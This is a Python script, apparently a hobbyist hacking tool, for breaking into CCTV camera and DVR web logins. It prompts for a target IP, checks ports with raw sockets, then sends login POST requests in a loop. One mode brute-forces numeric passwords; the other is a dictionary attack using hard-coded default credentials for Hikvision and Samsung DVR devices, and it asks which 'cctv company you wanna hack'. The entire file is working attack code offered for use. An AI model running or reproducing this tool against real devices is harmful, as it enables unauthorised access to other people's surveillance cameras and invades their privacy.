import itertools
import requests
import time as t
import socket

print("""
   ██▓ ▄████▄   ▄▄▄       ███▄ ▄███▓  ██████ ▓█████ ▓█████  █    ██ 
  ▓██▒▒██▀ ▀█  ▒████▄    ▓██▒▀█▀ ██▒▒██    ▒ ▓█   ▀ ▓█   ▀  ██  ▓██▒
  ▒██▒▒▓█    ▄ ▒██  ▀█▄  ▓██    ▓██░░ ▓██▄   ▒███   ▒███   ▓██  ▒██░
  ░██░▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██    ▒██   ▒   ██▒▒▓█  ▄ ▒▓█  ▄ ▓▓█  ░██░
  ░██░▒ ▓███▀ ░ ▓█   ▓██▒▒██▒   ░██▒▒██████▒▒░▒████▒░▒████▒▒▒█████▓ 
  ░▓  ░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░░░ ▒░ ░░░ ▒░ ░░▒▓▒ ▒ ▒ 
   ▒ ░  ░  ▒     ▒   ▒▒ ░░  ░      ░░ ░▒  ░ ░ ░ ░  ░ ░ ░  ░░░▒░ ░ ░ 
   ▒ ░░          ░   ▒   ░      ░   ░  ░  ░     ░      ░    ░░░ ░ ░ 
   ░  ░ ░            ░  ░       ░         ░     ░  ░   ░  ░   ░     
      ░                                                            
                                                       version : 1.0
                                                                      
          

    contact me -> minjunkim134@gmail.com

""")

t.sleep(1.5)
ccIP = input("\nTarget IP -->")
     
#######포트 생사여부########

def portscan(port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ccIP, port))
        print(str(port) + " is opened.")
    except:
        print(str(port) + " is closed.")

while True:
     port = input("Type a port you wanna see if it is opened -->")
     if port == "done":
         port = input("Type the port (format: ':<port>') ->")
         if ":" in port:
           break
         else: 
           port = input("format: ':<port>' ->")
           break 
     try:portscan(int(port))
     except:pass



####### final target IP #######
finalccIP = "http://" + ccIP + port
print("Excute on -> " + finalccIP)

##로그인 박스 이름##
nameBoxid = input("Type input field name for id -> ")
nameBoxpw = input("Type input field name for password -> ")

############옵션 제공 함수#################
def main():
     global opt
     print("""
     [1] Bruteforce attack
     [2] Dictionary
     """)
     opt = input("Select an option : ")




#######실행########

main()

if opt == '1':
     id = input("Bruteforce attack mode : What is ID for this? -->")
     Len = input("Bruteforce attack mode : How long is this password? -->")
     password = "0123456789"
     for password in itertools.product(password, repeat=int(Len)):
          pw = ''.join(password)
          print(pw)
          loginpacket = {
                    nameBoxid : id,
                    nameBoxpw : pw
               }
          address = requests.post(finalccIP, data=loginpacket)
          if "input" not in address.text:
                    print("login success")
                    print("\npassword : " + pw)
                    input()
                    quit()

elif opt == '2':
     print("""
     [1] Hikivision
     [2] Samsung DVR
     """)    
     cctvb = input("Dictionary attack mode : Choose a cctv company you wanna hack -> ")
     
     ######브루트포스공격######
     if cctvb == '1' :
               hikiId = 'admin'
               hikiPs = ['12345', '123456', 'admin']

               for hikips in hikiPs:
                    loginpacket = {
                    nameBoxid : hikiId,
                    nameBoxpw : hikips
                    }
                    address = requests.post(finalccIP, data=loginpacket)
                    if "input" not in address.text:
                         print("login success")
                         print("\nid : " + hikiId + " | password : " + hikips)
                         input()
                         quit()

     ######딕셔너리공격######
     elif cctvb == '2' :
               samId = ['admin', 'Admin']
               samPs = ['1111111', '4321', '1234']

               for samid in samId:
                   for samps in samPs:
                         loginpacket = {
                              nameBoxid : samid,
                              nameBoxpw : samps
                              }
                         address = requests.post(finalccIP, data=loginpacket)
                         if "input" not in address.text:
                              print("login success")
                              print("\nid : " + samid + " | password : " + samps)
                              input()
                              quit()
     else:
          print("That option doesn't exist yet..")
          t.sleep(2)


else:
     print("That option doesn't exist yet..")
     t.sleep(2)

          

     





